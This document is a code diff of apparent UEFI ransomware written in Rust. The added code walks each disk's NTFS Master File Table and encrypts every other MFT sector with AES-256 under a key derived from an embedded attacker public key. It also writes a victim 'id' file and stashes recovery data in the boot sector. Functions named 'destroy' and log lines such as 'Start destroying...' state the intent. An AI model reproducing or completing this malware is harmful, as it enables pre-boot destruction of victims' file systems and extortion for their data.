@@ -1,15 +1,17 @@
+use aes::cipher::{
+    generic_array::GenericArray, BlockEncrypt, NewBlockCipher,
+};
+use aes::{Aes256, Block};
 use alloc::vec;
 use alloc::vec::Vec;
 use core::ops::Range;
 use rand::rngs::OsRng;
-use uefi::{Error, Status};
-
 use uefi::prelude::SystemTable;
 use uefi::proto::media::block::BlockIO;
 use uefi::table::Boot;
+use uefi::{Error, Status};
 use x25519_dalek::{EphemeralSecret, PublicKey};
 
-use crate::file::read_file;
 use crate::file::write_file;
 
 const OEM_ID: &[u8; 8] = b"NTFS    ";
@@ -120,7 +122,8 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                         .try_into()
                         .unwrap(),
-                ) as u64) * 8;
+                ) as u64)
+                    * 8;
 
                 let mut data_run_first =
                     mft_entry_buf[data_run_offset + 3..data_run_offset + 6].to_vec();
@@ -152,12 +155,14 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                         .try_into()
                         .unwrap(),
-                ) as u64) * 8;
+                ) as u64)
+                    * 8;
                 let data_run_first = (u32::from_ne_bytes(
                     mft_entry_buf[data_run_offset + 3..data_run_offset + 7]
                         .try_into()
                         .unwrap(),
-                ) as u64) * 8;
+                ) as u64)
+                    * 8;
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 7;
             }
@@ -166,7 +171,11 @@ fn get_mft_ranges(
         }
     }
 
-    log::info!("{:#?}", ranges);
+    // Write size of the first run into the volume serial number of boot sector
+    let size: [u8; 8] = (ranges[0].end - ranges[0].start).to_ne_bytes();
+    blk.read_blocks(media_id, boot_sector, buf)?;
+    buf[72..80].copy_from_slice(&size);
+    blk.write_blocks(media_id, boot_sector, buf)?;
 
     Ok(ranges)
 }
@@ -176,29 +185,45 @@ fn beat_the_shit_out_of_the_mft(
     blk: &mut BlockIO,
     media_id: u32,
     mft_runs: Vec<Range<u64>>,
-    key: [u8; 32],
+    key_bytes: [u8; 32],
 ) -> uefi::Result {
-    let buf = [0u8; 512];
+    let mut buf = [0u8; 512];
+    let key = GenericArray::from_slice(&key_bytes);
+    let cipher = Aes256::new(key);
+    let mut blocks: Vec<Block> = vec![];
 
-    log::info!("Start destroying..."); // DEBUG
+    log::info!("Start destroying...");
 
     for run in mft_runs {
         for sector in run {
             if sector % 2 == 0 {
-                // TODO: cipher block
-                blk.write_blocks(media_id, sector, &buf)?;
+                blk.read_blocks(media_id, sector, &mut buf).unwrap();
+
+                for chunk in buf.chunks(16) {
+                    let mut block = Block::default();
+                    block.copy_from_slice(chunk);
+                    blocks.push(block);
+                }
+
+                cipher.encrypt_blocks(&mut blocks);
+
+                for (i, block) in blocks.iter().enumerate() {
+                    buf[16 * i..16 * i + 16].copy_from_slice(block.as_slice());
+                }
+
+                blocks.clear();
+
+                blk.write_blocks(media_id, sector, &buf).unwrap();
             }
         }
     }
 
-    log::info!("Finished !"); // DEBUG
+    log::info!("Finished !");
 
     Ok(())
 }
 
 pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
-    let mut sizes_buf: Vec<u8> = vec!();
-
     // Get list of handles which instantiate a BlockIO
     let handles = st.boot_services().find_handles::<BlockIO>()?;
 
@@ -222,7 +247,7 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
         if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
             let public_key_hex = include_str!("include/public_key.hex");
             let mut buf = [0u8; 32];
-            hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
+            hex::decode_to_slice(public_key_hex, &mut buf).unwrap();
             let public_key = PublicKey::from(buf);
 
             let rng = OsRng;
@@ -231,35 +256,12 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
             let key = secret.diffie_hellman(&public_key);
 
             let mut buf = [0u8; 64];
-            hex::encode_to_slice(id.as_bytes(), &mut buf).expect("id to hex");
-
+            hex::encode_to_slice(id.as_bytes(), &mut buf).unwrap();
             write_file(st, "id", &buf).unwrap();
-
-            // TODO: save ranges somewhere
-            let size: [u8; 8] = (ranges[0].end - ranges[0].start).to_ne_bytes();
-            sizes_buf.append(&mut size.to_vec());
-
 
             beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes())?;
         }
     }
-
-    sizes_buf.append(&mut vec![0u8; 8]);
-    write_file(st, "sizes", &sizes_buf)?;
-
-    let sizes2_buf = read_file(st, "sizes")?;
-
-    let mut offset = 0;
-    loop {
-        let size = u64::from_ne_bytes(sizes2_buf[offset..offset+8].try_into().unwrap());
-        if size == 0 { break; }
-
-        log::info!("Size: {}", size);
-        offset += 8;
-    }
-
-
-    loop {}
 
     Ok(())
 }
